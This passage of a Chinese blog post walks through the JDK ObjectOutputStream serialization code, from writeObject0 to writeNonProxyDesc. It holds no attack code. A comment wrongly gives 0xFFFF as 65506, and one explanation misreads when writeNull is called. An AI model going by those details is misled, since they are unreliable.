class="line">          <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">              writeString((String) obj, unshared);</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cl.isArray()) &#123;</span><br><span class="line">              writeArray(obj, desc, unshared);</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Enum) &#123;</span><br><span class="line">              writeEnum((Enum&lt;?&gt;) obj, desc, unshared);</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Serializable) &#123;</span><br><span class="line">              writeOrdinaryObject(obj, desc, unshared);</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">                  <span class="keyword">throw</span> <span class="keyword">new</span> NotSerializableException(</span><br><span class="line">                      cl.getName() + <span class="string">"\n"</span> + debugInfoStack.toString());</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                  <span class="keyword">throw</span> <span class="keyword">new</span> NotSerializableException(cl.getName());</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">          depth--;</span><br><span class="line">          bout.setBlockDataMode(oldMode);</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先第一步就把bout的块模式关掉了，原始模式赋值给了oldMode。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">boolean</span> oldMode = bout.setBlockDataMode(<span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><p>下一句<code>depth++</code>：表示的是对象序列化的深度。</p><blockquote><p>比如说对象A进行了序列化，那么depth++；</p><p>此时如果A中的字段(field)也是一个对象，需要对这个对象再次进行序列化，此时再一次depth++；</p><p>细心的可以发现其实在最后的finally里面配套的有depth–； </p><p>因而如果不出异常则 depth 最终会是 0，有异常则在 catch 模块时 depth 不为 0。</p></blockquote><p>接下来按照三步走的顺序来解析<code>writeObject0</code>做了什么：</p><p><strong>第一步：处理已经处理过的和不可替换的对象</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> h;</span><br><span class="line"><span class="comment">// 1. 替换后的对象为 null</span></span><br><span class="line"><span class="keyword">if</span> ((obj = subs.lookup(obj)) == <span class="keyword">null</span>) &#123;     </span><br><span class="line">    writeNull();</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"><span class="comment">// 2. handles存储的是已经序列化的对象句柄，如果找到了，直接写一个句柄就可以了</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!unshared &amp;&amp; (h = handles.lookup(obj)) != -<span class="number">1</span>) &#123;  </span><br><span class="line">    writeHandle(h);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"><span class="comment">// 3. Class 对象</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Class) &#123;</span><br><span class="line">    writeClass((Class) obj, unshared);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"><span class="comment">// 4. ObjectStreamClass 序列化类的描述信息</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> ObjectStreamClass) &#123;</span><br><span class="line">    writeClassDesc((ObjectStreamClass) obj, unshared);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>已经处理过的</strong>和<strong>不可替换的</strong>对象，这些都是不能够序列化的，其实在大多数情况下，我们的代码都不会进入第一步代码块。</p><p>首先进入<code>if ((obj = subs.lookup(obj)) == null)</code>这句：</p><img src="../images/Java%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E6%A2%B3%E7%90%86/image-20210715203720012.png" alt="image-20210715203720012" style="zoom:50%;"><p>lookup方法会在subs这个map中当前对象obj是否有可替换(writeReplace)对象，如果没有的话，则返回obj对象本身。</p><p>也就是说，这个方法实际上就是处理以前写入的对象和不可替换的对象。更直白点的意思，这段代码实际上做的是一个检测功能，如果检测到当前传入对象在 替换哈希表(<code>ReplaceTable</code>) 中无法找到，那么就调用<code>writeNull</code>方法。</p><p>下一个if判断是判断当前写入方式是不是“<code>unshared</code>”方式，然后可以看到紧跟着的就是<code>handles.lookup(obj)</code>，跟进去：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Looks up and returns handle associated with given object, or -1 if</span></span><br><span class="line"><span class="comment">* no mapping found.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lookup</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (size == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> index = hash(obj) % spine.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = spine[index]; i &gt;= <span class="number">0</span>; i = next[i]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (objs[i] == obj) &#123;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该方法会查找并返回与给定对象关联的<code>handler</code>，如果没有找到映射，则返回 -1；</p><p>直白的意思就是说判断是否在“引用哈希表(<code>HandleTable</code>)”中找到该引用，如果有，那么调用<code>writeHandle</code>方法并且返回；如果没找到，那么返回-1，需要进一步序列化处理。</p><p>接下来判断当前传入对象是不是特殊类型的<code>Class</code>和<code>ObjectStreamClass</code>，如果是，则调用<code>writeClass</code>或<code>writeClassDesc</code>方法并且返回；</p><p><strong>总结1：</strong> <strong>Java 序列化保存了很多与数据无关的数据，如类信息</strong>。但 Java 本身也做了一些优化，如 handles 保存了类的句柄，这样重复的类就只用保存一个句柄就可以了。</p><p><strong>第二步：查找可替换对象是否已经序列化了</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">Object orig = obj;</span><br><span class="line">Class&lt;?&gt; cl = obj.getClass();</span><br><span class="line">ObjectStreamClass desc;</span><br><span class="line"><span class="comment">// 1. 如果要序列化的对象中有 writeReplace 方法，则递归检查最终要输出的对象</span></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    Class&lt;?&gt; repCl;</span><br><span class="line">    desc = ObjectStreamClass.lookup(cl, <span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">// 如果要序列化的对象中有 writeReplace 方法，则递归检查最终要输出的对象</span></span><br><span class="line">    <span class="keyword">if</span> (!desc.hasWriteReplaceMethod() ||</span><br><span class="line">        (obj = desc.invokeWriteReplace(obj)) == <span class="keyword">null</span> ||</span><br><span class="line">        (repCl = obj.getClass()) == cl) &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cl = repCl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 2. 子类重写 ObjectOutputStream#replaceObject 方法</span></span><br><span class="line"><span class="keyword">if</span> (enableReplace) &#123;</span><br><span class="line">    Object rep = replaceObject(obj);</span><br><span class="line">    <span class="keyword">if</span> (rep != obj &amp;&amp; rep != <span class="keyword">null</span>) &#123;</span><br><span class="line">        cl = rep.getClass();</span><br><span class="line">        desc = ObjectStreamClass.lookup(cl, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    obj = rep;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 既然要序列化的对象已经被替换了，此时就需要再次做判断，和步骤1类似</span></span><br><span class="line"><span class="keyword">if</span> (obj != orig) &#123;</span><br><span class="line">    subs.assign(orig, obj);</span><br><span class="line">    <span class="keyword">if</span> (obj == <span class="keyword">null</span>) &#123;</span><br><span class="line">        writeNull();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!unshared &amp;&amp; (h = handles.lookup(obj)) != -<span class="number">1</span>) &#123;</span><br><span class="line">        writeHandle(h);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Class) &#123;</span><br><span class="line">        writeClass((Class) obj, unshared);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> ObjectStreamClass) &#123;</span><br><span class="line">        writeClassDesc((ObjectStreamClass) obj, unshared);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到是一个for无条件循环，重点是<code>desc = ObjectStreamClass.lookup(cl, true);</code> </p><p>这个方法很长，概括一下就是：</p><p><code>ObjectStreamClass.lookup()</code>封装待序列化的类生成类描述符 <em>（返回<code>ObjectStreamClass</code>类型）</em> ，获取包括类名、自定义<code>serialVersionUID</code>、可序列化字段 <em>（返回<code>ObjectStreamField</code>类型）</em> 和构造方法，以及<code>writeObject</code>、<code>readObject</code>方法等</p><p><strong>desc更像是一个类信息模板，需要查找类信息的时候，desc充当句柄。</strong></p><p>一步步看，一开始检查是否开启了<code>enableReplace</code>标志位，通常为false，不会进来。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (enableReplace) &#123;</span><br><span class="line">   Object rep = replaceObject(obj);</span><br><span class="line">   <span class="keyword">if</span> (rep != obj &amp;&amp; rep != <span class="keyword">null</span>) &#123;</span><br><span class="line">       cl = rep.getClass();</span><br><span class="line">       desc = ObjectStreamClass.lookup(cl, <span class="keyword">true</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   obj = rep;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再往下，如果对象是被替换的，则第二次进行原始检查：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// if object replaced, run through original checks a second time</span></span><br><span class="line"><span class="keyword">if</span> (obj != orig) &#123;</span><br><span class="line">    subs.assign(orig, obj);</span><br><span class="line">    <span class="keyword">if</span> (obj == <span class="keyword">null</span>) &#123;</span><br><span class="line">        writeNull();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!unshared &amp;&amp; (h = handles.lookup(obj)) != -<span class="number">1</span>) &#123;</span><br><span class="line">        writeHandle(h);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Class) &#123;</span><br><span class="line">        writeClass((Class) obj, unshared);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> ObjectStreamClass) &#123;</span><br><span class="line">        writeClassDesc((ObjectStreamClass) obj, unshared);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果对象被替换，这里会对原始对象进行二次检查，和最开始的那段代码很像，这里先将替换对象插入到<code>subs</code>(替换哈希表)中，然后进行类似的判断。</p><p><strong>第三步：序列化对象</strong></p><p>以上执行都完成过后，会处理剩余对象类型：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// remaining cases</span></span><br><span class="line"><span class="keyword">if</span> (obj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">    writeString((String) obj, unshared);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (cl.isArray()) &#123;</span><br><span class="line">    writeArray(obj, desc, unshared);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Enum) &#123;</span><br><span class="line">    writeEnum((Enum&lt;?&gt;) obj, desc, unshared);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Serializable) &#123;</span><br><span class="line">    writeOrdinaryObject(obj, desc, unshared);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NotSerializableException(</span><br><span class="line">            cl.getName() + <span class="string">"\n"</span> + debugInfoStack.toString());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NotSerializableException(cl.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Switch-case模式：</p><ul><li>如果对象是String类型，那么调用<code>writeString</code>方法将数据写入字节流；</li><li>如果对象是Array类型，那么调用<code>writeArray</code>方法将数据写入字节流；</li><li>如果对象为Enum类型，调用<code>writeEnum</code>方法将数据写入字节流；</li><li>如果对象实现了<code>Serializable</code>接口，调用<code>writeOrdinaryObject</code>方法将数据写入字节流；</li></ul><p>以上条件都不满足时则抛出<code>NotSerializableException</code>异常信息；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// String 类型</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeString</span><span class="params">(String str, <span class="keyword">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    handles.assign(unshared ? <span class="keyword">null</span> : str);</span><br><span class="line">    <span class="keyword">long</span> utflen = bout.getUTFLength(str);</span><br><span class="line">    <span class="keyword">if</span> (utflen &lt;= <span class="number">0xFFFF</span>) &#123;     <span class="comment">// 长度小于 0xFFFF(65506)</span></span><br><span class="line">        bout.writeByte(TC_STRING);  <span class="comment">// 类型</span></span><br><span class="line">        bout.writeUTF(str, utflen); <span class="comment">// 内容</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;                    <span class="comment">// 长度大于 0xFFFF(65506)</span></span><br><span class="line">        bout.writeByte(TC_LONGSTRING);</span><br><span class="line">        bout.writeLongUTF(str, utflen);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Enum 类型</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeEnum</span><span class="params">(Enum&lt;?&gt; en, ObjectStreamClass desc, </span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    bout.writeByte(TC_ENUM);                <span class="comment">// 1. 类型</span></span><br><span class="line">    ObjectStreamClass sdesc = desc.getSuperDesc();  <span class="comment">// 2. 类信息</span></span><br><span class="line">    writeClassDesc((sdesc.forClass() == Enum.class) ? desc : sdesc, false);</span><br><span class="line">    handles.assign(unshared ? <span class="keyword">null</span> : en);</span><br><span class="line">    writeString(en.name(), <span class="keyword">false</span>);          <span class="comment">// 3. 枚举类的名称</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现了 Serializable 接口的序列化</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeOrdinaryObject</span><span class="params">(Object obj, ObjectStreamClass desc,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException </span>&#123;    </span><br><span class="line">    desc.checkSerialize();</span><br><span class="line"></span><br><span class="line">    bout.writeByte(TC_OBJECT);      <span class="comment">// 1. 类型</span></span><br><span class="line">    writeClassDesc(desc, <span class="keyword">false</span>);    <span class="comment">// 2. 类信息</span></span><br><span class="line">    handles.assign(unshared ? <span class="keyword">null</span> : obj);</span><br><span class="line">    <span class="keyword">if</span> (desc.isExternalizable() &amp;&amp; !desc.isProxy()) &#123;</span><br><span class="line">        writeExternalData((Externalizable) obj);    <span class="comment">// 3.1 实现 Externalizable 接口的类</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        writeSerialData(obj, desc); <span class="comment">// 3.2 实现 Serializable 接口的类，数据序列化</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前面三个大同小异，panda师傅简单的举例了一下<code>writeString</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeString</span><span class="params">(String str, <span class="keyword">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    handles.assign(unshared ? <span class="keyword">null</span> : str);</span><br><span class="line">    <span class="keyword">long</span> utflen = bout.getUTFLength(str);</span><br><span class="line">    <span class="keyword">if</span> (utflen &lt;= <span class="number">0xFFFF</span>) &#123;</span><br><span class="line">        bout.writeByte(TC_STRING);</span><br><span class="line">        bout.writeUTF(str, utflen);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        bout.writeByte(TC_LONGSTRING);</span><br><span class="line">        bout.writeLongUTF(str, utflen);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先在写入String对象之前，代码会判断当前写入方式是否是<code>unshared</code>，如果不是<code>unshared</code>方式还需要在<code>handles</code>这个对象映射表中插入当前String对象；接着，代码会调用<code>getUTFLength</code>函数获取String字符串的长度和<code>0xFFFF</code>比较，如果大于该值时，表示当前String对象是一个长字符串对象，那么会先写入<code>TC_LONGSTRING</code>标记（表示是LONGSTRING类型数据），然后写入字符串的长度和内容；如果小于等于该值时，表示当前String对象就是一个普通的字符串对象，那么会先写入<code>TC_STRING</code>标记（表示是一个STRING类型对象），然后写入字符串的长度和内容。</p><h2 id="writeOrdinaryObject"><a href="#writeOrdinaryObject" class="headerlink" title="writeOrdinaryObject"></a>writeOrdinaryObject</h2><p>终于到了重点分析的方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Writes representation of a "ordinary" (i.e., not a String, Class,</span></span><br><span class="line"><span class="comment"> * ObjectStreamClass, array, or enum constant) serializable object to the</span></span><br><span class="line"><span class="comment"> * stream.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeOrdinaryObject</span><span class="params">(Object obj, ObjectStreamClass desc, <span class="keyword">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">        debugInfoStack.push(</span><br><span class="line">            (depth == <span class="number">1</span> ? <span class="string">"root "</span> : <span class="string">""</span>) + <span class="string">"object (class \""</span> +</span><br><span class="line">            obj.getClass().getName() + <span class="string">"\", "</span> + obj.toString() + <span class="string">")"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        desc.checkSerialize();</span><br><span class="line"></span><br><span class="line">        bout.writeByte(TC_OBJECT);</span><br><span class="line">        writeClassDesc(desc, <span class="keyword">false</span>);</span><br><span class="line">        handles.assign(unshared ? <span class="keyword">null</span> : obj);</span><br><span class="line">        <span class="keyword">if</span> (desc.isExternalizable() &amp;&amp; !desc.isProxy()) &#123;</span><br><span class="line">            writeExternalData((Externalizable) obj);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            writeSerialData(obj, desc);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">            debugInfoStack.pop();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先来到<code>desc.checkSerialize();</code>，desc其实就是类描述信息，判断当前对象是否是可以被序列化的，也就是是否实现了<code>Serializable</code>接口。</p><p>如果是一个可序列化对象，那么会开始写入<code>TC_OBJECT</code>标记（表示开始序列化操作），随后调用<code>writeClassDesc</code>方法写入当前对象所属类的类描述信息，跟进去：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Writes representation of given class descriptor to stream.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeClassDesc</span><span class="params">(ObjectStreamClass desc, <span class="keyword">boolean</span> unshared)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> handle;</span><br><span class="line">    <span class="keyword">if</span> (desc == <span class="keyword">null</span>) &#123;</span><br><span class="line">        writeNull();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!unshared &amp;&amp; (handle = handles.lookup(desc)) != -<span class="number">1</span>) &#123;</span><br><span class="line">        writeHandle(handle); <span class="comment">// 类信息已经序列化，则保存句柄即可</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (desc.isProxy()) &#123;</span><br><span class="line">        writeProxyDesc(desc, unshared);<span class="comment">//代理类信息序列化</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        writeNonProxyDesc(desc, unshared);<span class="comment">// 非代理类信息序列化</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>writeClassDesc</code>方法主要用于判断当前的类描述符使用什么方式写入：</p><ul><li>如果传入的类描述信息是一个null，那么会调用<code>writeNull</code>方法；</li><li>如果没有使用<code>unshared</code>方式，并且可以在<code>handles</code>对象池中找到传入的对象信息，说明类信息已经序列化，那么调用<code>writeHandle</code>保存句柄即可；</li><li>如果传入的类是一个动态代理类，那么调用<code>writeProxyDesc</code>方法；</li><li>如果上面三个条件都不满足，那么调用<code>writeNonProxyDesc</code>方法。</li></ul><p>跟进<code>writeNonProxyDesc(desc, unshared)</code>这里：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Writes class descriptor representing a standard (i.e., not a dynamic</span></span><br><span class="line"><span class="comment"> * proxy) class to stream.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeNonProxyDesc</span><span class="params">(ObjectStreamClass desc, <span class="keyword">boolean</span> unshared)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bout.writeByte(TC_CLASSDESC);</span><br><span class="line">    handles.assign(unshared ? <span class="keyword">null</span> : desc);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (protocol == PROTOCOL_VERSION_1) &#123;</span><br><span class="line">        <span class="comment">// do not invoke class descriptor write hook with old protocol</span></span><br><span class="line">        desc.writeNonProxy(<span class="keyword">this</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        writeClassDescriptor(desc);<span class="comment">// 写入类描述符用来保存类信息，本质上也是调用 desc.writeNonProxy(this)</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; cl = desc.forClass();</span><br><span class="line">    bout.setBlockDataMode(<span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (cl != <span class="keyword">null</span> &amp;&amp; isCustomSubclass()) 